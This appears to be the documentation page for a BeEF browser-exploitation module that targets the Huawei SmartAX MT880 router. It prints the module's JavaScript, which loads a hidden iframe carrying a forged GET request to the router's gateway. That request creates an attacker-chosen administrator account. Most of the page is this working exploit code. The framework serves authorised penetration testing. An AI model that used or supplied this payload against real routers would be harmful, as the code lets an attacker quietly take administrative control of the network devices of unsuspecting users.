## Summary

* **Objective**: add an administrator account on a Huawei SmartAX MT880 router
* **Authors**: bcoles
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/exploits/router/huawei_smartax_mt880)

## Internal Working

Uses an invisible iframe with a GET request to add an admin account

```js
  var gateway  = '<%= @base %>';
  var username = '<%= @username %>';
  var passwd   = '<%= @password %>';
  var timeout  = 15;

  var huawei_smartax_mt880_iframe_<%= @command_id %> = beef.dom.createInvisibleIframe();
  huawei_smartax_mt880_iframe_<%= @command_id %>.setAttribute('src', gateway+"Action?user_id="+username+"&priv=1&pass1="+passwd+"&pass2="+passwd+"&id=70");

```

## Feedback

